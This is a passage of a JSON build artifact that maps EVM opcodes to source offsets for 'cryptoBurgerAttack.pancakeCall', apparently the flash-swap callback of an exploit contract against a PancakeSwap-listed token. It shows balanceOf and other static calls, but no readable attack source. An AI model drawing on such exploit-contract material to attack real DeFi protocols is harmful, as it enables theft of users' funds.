      "value": "0xA0"
    },
    "4572": {
      "op": "ADD"
    },
    "4573": {
      "op": "SWAP1"
    },
    "4574": {
      "op": "JUMP"
    },
    "4575": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4578": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4579": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4581": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "SUB",
      "path": "0"
    },
    "4582": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4583": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "LOG1",
      "path": "0"
    },
    "4584": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6602
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 37,
      "value": "0x0"
    },
    "4586": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6602
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4587": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4589": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4590": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "4595": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4597": {
      "op": "SHL"
    },
    "4598": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4599": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4600": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6621,
        6625
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "4601": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4603": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4604": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ADD",
      "path": "0"
    },
    "4605": {
      "op": "MSTORE"
    },
    "4606": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4608": {
      "op": "DUP1"
    },
    "4609": {
      "op": "MLOAD"
    },
    "4610": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4612": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "4615": {
      "op": "DUP4"
    },
    "4616": {
      "op": "CODECOPY"
    },
    "4617": {
      "op": "DUP2"
    },
    "4618": {
      "op": "MLOAD"
    },
    "4619": {
      "op": "SWAP2"
    },
    "4620": {
      "op": "MSTORE"
    },
    "4621": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4622": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4624": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4626": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4628": {
      "op": "SHL"
    },
    "4629": {
      "op": "SUB"
    },
    "4630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6602
      ],
      "op": "AND",
      "path": "0"
    },
    "4631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6602
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4632": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6612
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "4637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6612
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4638": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4640": {
      "op": "ADD"
    },
    "4641": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4645": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4646": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4648": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "SUB",
      "path": "0"
    },
    "4649": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4650": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4651": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "GAS",
      "path": "0"
    },
    "4652": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4653": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4654": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4655": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4656": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x123D"
    },
    "4659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4660": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4661": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4663": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4664": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4665": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4666": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4668": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4669": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4670": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "POP",
      "path": "0"
    },
    "4671": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "POP",
      "path": "0"
    },
    "4672": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "POP",
      "path": "0"
    },
    "4673": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "POP",
      "path": "0"
    },
    "4674": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4676": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4677": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4678": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4680": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "NOT",
      "path": "0"
    },
    "4681": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ADD",
      "path": "0"
    },
    "4685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "AND",
      "path": "0"
    },
    "4686": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4687": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ADD",
      "path": "0"
    },
    "4688": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4689": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4691": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4692": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "POP",
      "path": "0"
    },
    "4693": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4694": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "ADD",
      "path": "0"
    },
    "4695": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4696": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1261"
    },
    "4699": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4700": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4701": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "4704": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6588,
        6627
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4705": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6588,
        6627
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4706": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4708": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4709": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x126E"
    },
    "4712": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4713": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4714": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "4717": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6531,
        6637
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4718": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4719": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4721": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4722": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4723": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4724": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SUB",
      "path": "0"
    },
    "4725": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4726": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6531,
        6637
      ],
      "op": "LOG1",
      "path": "0"
    },
    "4727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6647,
        6711
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 38,
      "value": "0x12AA"
    },
    "4730": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4732": {
      "op": "DUP1"
    },
    "4733": {
      "op": "MLOAD"
    },
    "4734": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4736": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "4739": {
      "op": "DUP4"
    },
    "4740": {
      "op": "CODECOPY"
    },
    "4741": {
      "op": "DUP2"
    },
    "4742": {
      "op": "MLOAD"
    },
    "4743": {
      "op": "SWAP2"
    },
    "4744": {
      "op": "MSTORE"
    },
    "4745": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4747": {
      "op": "DUP1"
    },
    "4748": {
      "op": "MLOAD"
    },
    "4749": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4751": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "4754": {
      "op": "DUP4"
    },
    "4755": {
      "op": "CODECOPY"
    },
    "4756": {
      "op": "DUP2"
    },
    "4757": {
      "op": "MLOAD"
    },
    "4758": {
      "op": "SWAP2"
    },
    "4759": {
      "op": "MSTORE"
    },
    "4760": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6680
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4761": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6681,
        6682
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4763": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4764": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4765": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4766": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "LT",
      "path": "0"
    },
    "4767": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "4770": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4771": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "4774": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6668,
        6683
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "4777": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6668,
        6683
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4778": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6647,
        6711
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4779": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 39,
      "value": "0x40"
    },
    "4781": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4782": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "4787": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "4789": {
      "op": "SHL"
    },
    "4790": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4791": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4792": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4794": {
      "op": "DUP1"
    },
    "4795": {
      "op": "MLOAD"
    },
    "4796": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4798": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "4801": {
      "op": "DUP4"
    },
    "4802": {
      "op": "CODECOPY"
    },
    "4803": {
      "op": "DUP2"
    },
    "4804": {
      "op": "MLOAD"
    },
    "4805": {
      "op": "SWAP2"
    },
    "4806": {
      "op": "MSTORE"
    },
    "4807": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6786
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "4813": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6786
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4814": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x12DD"
    },
    "4817": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4818": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6800,
        6815
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4819": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6800,
        6815
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4820": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6829,
        6833
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4821": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6829,
        6833
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4822": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4824": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ADD",
      "path": "0"
    },
    "4825": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "4828": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4829": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4830": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4832": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4834": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4835": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4836": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4837": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SUB",
      "path": "0"
    },
    "4838": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4839": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "GAS",
      "path": "0"
    },
    "4841": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4842": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4843": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x12FA"
    },
    "4848": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4854": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4858": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "POP",
      "path": "0"
    },
    "4860": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "POP",
      "path": "0"
    },
    "4861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "POP",
      "path": "0"
    },
    "4862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "POP",
      "path": "0"
    },
    "4863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4865": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4866": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4867": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4869": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4870": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4871": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4873": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4876": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ADD",
      "path": "0"
    },
    "4877": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "4879": {
      "op": "NOT"
    },
    "4880": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "AND",
      "path": "0"
    },
    "4881": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ADD",
      "path": "0"
    },
    "4883": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4885": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4886": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1322"
    },
    "4889": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4890": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4891": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4892": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "ADD",
      "path": "0"
    },
    "4893": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4894": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "4897": {
